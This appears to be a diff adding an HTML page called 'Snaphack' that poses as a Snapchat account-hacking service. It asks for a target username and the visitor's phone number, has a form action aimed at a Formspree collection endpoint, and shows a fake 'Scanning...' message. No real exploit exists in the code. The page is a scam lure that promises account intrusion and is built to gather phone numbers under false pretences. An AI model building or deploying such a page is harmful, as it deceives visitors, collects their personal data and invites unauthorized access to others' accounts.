@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Snaphack</title>
+  <style>
+    body {
+      background-color: #000;
+      color: red;
+      font-family: monospace;
+      text-align: center;
+      padding: 40px;
+    }
+    h1 {
+      font-size: 3em;
+      margin-bottom: 20px;
+    }
+    input, button {
+      background-color: #111;
+      color: red;
+      border: 1px solid red;
+      padding: 10px;
+      margin: 10px;
+      width: 250px;
+    }
+    button:hover {
+      background-color: red;
+      color: black;
+      cursor: pointer;
+    }
+    .hidden {
+      display: none;
+    }
+    #response {
+      font-size: 1.5em;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Snaphack</h1>
+  <p>Enter the info to begin the scan 🔍</p>
+
+  <form id="hackForm" action="https://formspree.io/f/xrbpvblo" method="POST">
+    <input type="text" name="Snapchat Username" placeholder="Snapchat Username" required><br>
+    <input type="tel" name="Phone Number" id="phone" placeholder="Phone Number (e.g., 123-456-7890)" required><br>
+    <button type="submit">Start Hack</button>
+  </form>
+
+  <p id="response" class="hidden">Scanning... Results will be sent via text 📡</p>
+
+  <script>
+    const form = document.getElementById('hackForm');
+    const response = document.getElementById('response');
+    const phoneInput = document.getElementById('phone');
+
+    // Regular expression for phone number format (xxx-xxx-xxxx)
+    const phoneRegex = /^\d{3}-\d{3}-\d{4}$/;
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();  // Prevent form from reloading the page
+
+      // Check if phone number matches the pattern
+      if (!phoneRegex.test(phoneInput.value)) {
+        alert("Please enter a valid phone number in the format 123-456-7890.");
+        return; // Don't submit if invalid
+      }
+
+      response.classList.remove('hidden');  // Show the success message
+      form.reset();  // Reset the form after submission
+    });
+  </script>
+
+</body>
+</html>
